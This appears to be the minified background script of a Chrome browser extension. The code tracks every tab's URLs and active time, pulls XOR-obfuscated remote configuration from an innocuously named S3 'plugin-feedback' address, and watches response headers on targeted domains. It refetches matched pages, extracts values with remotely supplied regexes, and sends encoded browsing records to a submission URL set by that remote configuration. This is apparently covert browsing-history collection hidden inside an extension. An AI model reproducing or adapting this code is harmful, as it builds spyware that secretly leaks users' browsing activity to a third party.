(function(){function e(e){for(var t=0;e.length>t;t++)try{h+=c.charAt(e[t])}catch(n){}}function t(e,t){return null==e&&(e=(new Date).getTime()),{at:0,tt:0,la:e,fa:e,u:null==t?null:t.url,t:[]}}function n(e){var n=(new Date).getTime(),a=v[""+e.id];null==a?a=t(n,e):(a.at=0,a.tt=0,a.la=n,a.fa=n,null==a.u&&(a.u=null==e?null:e.url)),null!=e&&(v[""+e.id]=a)}function a(){var e=[];chrome.tabs.query({},function(t){t.forEach(function(t){e[""+t.id]=1});for(tabId in v)null==e[tabId]&&delete v[tabId];for(windowId in m)null==e[""+m[windowId]]&&delete m[windowId]})}function r(e){if(!b){if(null==e)return;var t=e.u,n=(new Date).getTime();if(null!=t&&0==t.indexOf("http")&&e.t.length>0){null!=e.la&&(e.at+=n-e.la);var a=n-e.fa,r=[];e.t.forEach(function(e){null!=e&&e!==void 0&&r.push(e)}),o({u:t,at:""+e.at,tt:""+a,t:r,eid:c})}}b=!1}function l(e){var t="";if(null!=e)for(i=0;e.length>i;i++){var n=e.charCodeAt(i),a=385^n;t+=String.fromCharCode(a)}return t}function o(e){if(localStorage.status_data_collect){var t=new XMLHttpRequest;t.open("POST",g,!0),t.setRequestHeader("Content-type","application/x-www-form-urlencoded"),t.send("d="+encodeURIComponent(l(JSON.stringify(e))))}}function u(e){chrome.webRequest.onHeadersReceived.addListener(function(n){if(localStorage.status_data_collect&&-1!=n.tabId){for(var a=null,r=0;n.responseHeaders.length>r;r++){var l=n.responseHeaders[r].name;if("content-type"==l.toLowerCase())a=n.responseHeaders[r].value;else if("Referer"==l)for(var i=n.responseHeaders[r],o=0;p.br.length>r;o++)if(i.indexOf(br[o])>=0)return}var u=null;e.ctm1&&(u=RegExp(e.ctm1,"i")),(!e.ctm1||null!=a&&u.test(a))&&([n.url,""],chrome.tabs.get(n.tabId,function(a){var r="";chrome.tabs.getSelected(null,function(l){r=l.url;var i=n.url.toLowerCase();if(e.fm1&&""!=e.fm1){var o=RegExp(e.fm1,"i");if(!o.test(i))return}if(e.fm2&&""!=e.fm2){var u=RegExp(e.fm2,"i");if(!u.test(i))return}if(e.fnm1&&""!=e.fnm1){var d=RegExp(e.fnm1,"i");if(d.test(i))return}s(n.url,e,function(l,i){var o=v[""+n.tabId];null==o&&(o=t()),o.t.push({aid:e.aid,ct:e.ct,t:e.t,tu:null!=a?a.url:null,u:n.url,ts:Math.round(n.timeStamp)+"",atu:r,a:l,lp:i}),v[""+n.tabId]=o})})}))}},{urls:["*://"+(0==e.d.indexOf(".")?"*"+e.d:e.d)+"/*"]},["responseHeaders"])}function d(){if(localStorage.status_data_collect){var e=new XMLHttpRequest;e.open("GET","https://s3.amazonaws.com/plugin-feedback/config.7",!0),e.onreadystatechange=function(){if(4==e.readyState){p=JSON.parse(l(e.responseText));for(var t=0;p.br.length>t;t++){var n=p.br[t];chrome.webRequest.onBeforeSendHeaders.addListener(function(){b=!0},{urls:["*://"+(0==n.indexOf(".")?"*"+n:n)+"/*"]},["requestHeaders"])}for(var t=0;p.config.length>t;t++)g=p.submissionUrl,u(p.config[t])}},e.send()}}function f(e,t){var n="",a=RegExp(e,"i"),r=t.match(a);return r&&r.length>1?n=r[1]:r&&r.length>0&&(n=r[0]),n}function s(e,t,n){if(localStorage.status_data_collect){if(0==t.ppl)return n(),void 0;for(i=0;t.ur.length>i;i++){var a=RegExp(t.ur[i].sr,"i");e=e.replace(a,t.ur[i].rs)}var r=new XMLHttpRequest;r.open("GET",e,!0),r.onreadystatechange=function(){if(4==r.readyState){var e=r.responseText,a="",l="";if(t.ar){var a=f(t.ar,e);a&&0!=a.length||(a=f(t.ar2,e))}if(t.lr){var l=f(t.lr,e);l&&0!=l.length||(l=f(t.lr2,e))}""!=a&&""!=l&&n(a,l)}},r.send()}}var c=chrome.i18n.getMessage("@@extension_id"),h="",v=[],m=[],g=null,p=null,b=!1;e([3,7,9,4,14,17,10,15]),chrome.tabs.onDetached.addListener(function(e,t){delete m[""+t.oldWindowId]}),chrome.tabs.onAttached.addListener(function(e,t){m[""+t.newWindowId]=e}),chrome.tabs.onCreated.addListener(function(e){a(),n(e)}),chrome.tabs.onActivated.addListener(function(e){var n=(new Date).getTime(),a=m[""+e.windowId];if(null!=a){var r=v[""+a];null!=r&&(r.at+=n-r.la,r.la=null)}m[""+e.windowId]=e.tabId,null==v[""+e.tabId]?v[""+e.tabId]=t(n):v[""+e.tabId].la=n}),chrome.tabs.onReplaced.addListener(function(e,t){var a=v[""+t];r(a),delete v[""+t],chrome.tabs.get(e,function(e){n(e)})}),chrome.tabs.onUpdated.addListener(function(e,n,a){var l=n.url;if(null!=l&&0==l.indexOf("http")){var o=(new Date).getTime(),u=v[""+e];if(null!=u){if("chrome://newtab/"==u.u)return u.u=l,void 0;var d=[];for(i=0;u.t.length>i;i++){var f=u.t[i];null==f.tu?(f.tu=u.u,f.atu=u.u,u.t[i]=f):u.u!=u.t[i].tu&&(d.push(u.t[i]),delete u.t[i])}r(u);var s=t(o,a);s.t=d,v[""+e]=s}}}),chrome.tabs.onRemoved.addListener(function(e){var t=v[""+e];r(t),delete v[""+e]});var w="true"==localStorage.status_data_collect;w&&d()})();